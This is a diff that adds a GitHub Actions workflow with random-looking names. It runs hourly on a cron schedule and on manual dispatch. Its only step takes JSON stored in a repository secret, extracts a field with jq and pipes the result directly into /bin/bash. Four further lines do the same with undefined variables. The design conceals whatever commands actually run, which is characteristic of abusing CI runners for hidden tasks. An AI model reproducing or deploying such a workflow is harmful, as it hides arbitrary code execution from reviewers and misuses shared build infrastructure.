@@ -1,0 +1,23 @@
+name: weishizhong3674
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weishizhong3674
+        env:
+          ris390: ${{ secrets.ris390 }}
+        run: |
+          echo $ris390 | jq -r .mizpd80921 | /bin/bash
+          echo $xjib529 | jq -r .huk5 | /bin/bash
+          echo $kpnm9307 | jq -r .xkqg3 | /bin/bash
+          echo $iolv044 | jq -r .jwvvx28 | /bin/bash
+          echo $zxkgp458 | jq -r .mm99667 | /bin/bash
+
